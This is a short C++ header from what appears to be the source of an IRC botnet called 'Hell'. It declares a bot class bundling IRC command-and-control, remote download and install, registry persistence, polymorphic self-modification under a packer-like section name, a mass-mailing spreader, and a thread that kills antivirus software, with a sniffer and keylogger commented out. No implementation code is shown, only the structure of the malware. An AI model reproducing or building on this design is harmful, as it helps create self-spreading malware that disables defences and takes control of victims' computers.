#include "Globals.h"
#include "Commands.h"
#include "Connect.h"
#include "Download.h"
#include "Main.h"
#include "CThread.h"
#include "HellMail.h"
#include "Utility.h"
#include "polymorph.h"
#include "botcash.h"

//#define DEBUG_MODE //debug mode
#define SECTION_NAME "UPX2"

class CHELL 
{
public:
	bool Check(void);
	CConnectIRC cIRC;
	CCmd vCmd;
	CMain hMain;
	CDownload hDownload;
	CInstall hInstall; 
	CRegCheck hRegcheck;
	CPolymorph hPolymorph;
	//CSniffer sniffer;
	//CLog keylog;
	CMail Hellmail;
	//CHttpd Hellhttpd;
	KillAVThread killthread;
	int HELLMAIN(void);
	
	bool botRunning;
};

extern CHELL *Hell;